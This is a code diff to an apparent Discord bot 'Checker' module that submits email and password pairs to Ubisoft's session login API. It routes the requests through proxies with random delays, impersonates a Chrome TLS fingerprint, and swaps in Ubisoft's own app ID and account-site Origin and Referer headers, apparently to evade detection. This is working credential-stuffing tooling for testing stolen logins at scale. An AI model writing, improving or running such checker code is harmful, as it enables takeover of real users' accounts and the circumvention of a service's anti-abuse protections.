@@ -11,8 +11,8 @@ import os
 import json
 from curl_cffi import requests
 
-# R6 Tracker App ID
-UBI_APP_ID = "f68a4a32-28b1-4e20-9f9f-6b9b6d1b8a52"
+# Original Ubisoft App ID
+UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"
 
 class Checker(commands.Cog):
     def __init__(self, bot):
@@ -57,13 +57,13 @@ class Checker(commands.Cog):
         await asyncio.sleep(random.uniform(1.0, 2.0))
 
         headers = {
-            "Content-Type": "application/json",
+            "Content-Type": "application/x-www-form-urlencoded",
             "Ubi-AppId": UBI_APP_ID,
             "Authorization": f"Basic {b64_auth}",
             "Accept": "application/json",
             "Accept-Language": "en-US,en;q=0.9",
-            "Origin": "https://r6.tracker.network",
-            "Referer": "https://r6.tracker.network/",
+            "Origin": "https://account.ubisoft.com",
+            "Referer": "https://account.ubisoft.com/",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         }
 
@@ -76,7 +76,7 @@ class Checker(commands.Cog):
                 return requests.post(
                     "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                     headers=headers,
-                    json={"rememberMe": True, "spaceId": "0d2ae42d-4c27-4cb7-af6c-2099062302bb"},
+                    data="rememberMe=true",
                     impersonate="chrome124",
                     proxy=proxy,
                     timeout=15
@@ -198,13 +198,13 @@ class Checker(commands.Cog):
                 b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
                 
                 headers = {
-                    "Content-Type": "application/json",
+                    "Content-Type": "application/x-www-form-urlencoded",
                     "Ubi-AppId": UBI_APP_ID,
                     "Authorization": f"Basic {b64_auth}",
                     "Accept": "application/json",
                     "Accept-Language": "en-US,en;q=0.9",
-                    "Origin": "https://r6.tracker.network",
-                    "Referer": "https://r6.tracker.network/",
+                    "Origin": "https://account.ubisoft.com",
+                    "Referer": "https://account.ubisoft.com/",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
                 }
 
@@ -214,7 +214,7 @@ class Checker(commands.Cog):
                     return requests.post(
                         "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                         headers=headers,
-                        json={"rememberMe": True, "spaceId": "0d2ae42d-4c27-4cb7-af6c-2099062302bb"},
+                        data="rememberMe=true",
                         impersonate="chrome124",
                         proxy=proxy,
                         timeout=15
